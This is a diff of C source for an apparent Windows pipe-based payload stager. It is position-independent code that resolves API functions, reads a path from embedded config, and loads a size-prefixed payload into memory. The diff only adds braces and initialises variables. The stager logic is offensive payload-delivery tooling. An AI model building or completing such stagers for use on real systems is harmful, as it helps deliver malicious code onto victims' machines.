@@ -77,10 +77,12 @@ static int read_all(fn_ReadFile rf, void *h, void *buf, pic_u32 count)
 	unsigned long got = 0;
 	pic_u32 done = 0;
 	while (done < count) {
-		if (!rf(h, p + done, count - done, &got, PIC_NULL))
+		if (!rf(h, p + done, count - done, &got, PIC_NULL)) {
 			return 0;
-		if (got == 0)
+		}
+		if (got == 0) {
 			return 0;
+		}
 		done += (pic_u32)got;
 	}
 	return 1;
@@ -111,10 +113,12 @@ static pic_u16 load_path(char *path)
 	const pic_u8 *cfg = (const pic_u8 *)stager_pipe_windows_config;
 
 	pic_u16 path_len = (pic_u16)cfg[0] | ((pic_u16)cfg[1] << 8);
-	if ((0U == path_len) || (PATH_MAX_LEN <= path_len))
+	if ((0U == path_len) || (PATH_MAX_LEN <= path_len)) {
 		return 0;
-	for (pic_u16 i = 0; i < path_len; i++)
+	}
+	for (pic_u16 i = 0; i < path_len; i++) {
 		path[i] = (char)cfg[2 + i];
+	}
 	path[path_len] = '\0';
 	return path_len;
 }
@@ -130,8 +134,9 @@ PIC_TEXT
 static pic_u32 read_payload_size(const struct resolved_funcs *funcs, void *h)
 {
 	pic_u8 size_buf[4];
-	if (!read_all(funcs->read_file, h, size_buf, 4))
+	if (!read_all(funcs->read_file, h, size_buf, 4)) {
 		return 0;
+	}
 	return (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
 		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
 }
@@ -146,13 +151,14 @@ static void *alloc_payload(const struct resolved_funcs *funcs, pic_u32 size)
 PIC_TEXT
 static void *load_payload(const struct resolved_funcs *funcs, const char *path)
 {
-	void *h;
-	pic_u32 size;
-	void *mem;
+	void *h = 0;
+	pic_u32 size = 0;
+	void *mem = 0;
 
 	h = open_input(funcs, path);
-	if (h == (void *)-1)
+	if (h == (void *)-1) {
 		return PIC_NULL;
+	}
 
 	size = read_payload_size(funcs, h);
 	if (size == 0 || size > 0x10000000) {
@@ -179,8 +185,8 @@ void _start(void)
 {
 	struct resolved_funcs funcs;
 	char path[PATH_MAX_LEN];
-	pic_u16 path_len;
-	void *mem;
+	pic_u16 path_len = 0;
+	void *mem = 0;
 
 	resolve_funcs(&funcs);
 	if (!funcs.create_file || !funcs.read_file || !funcs.close_handle ||
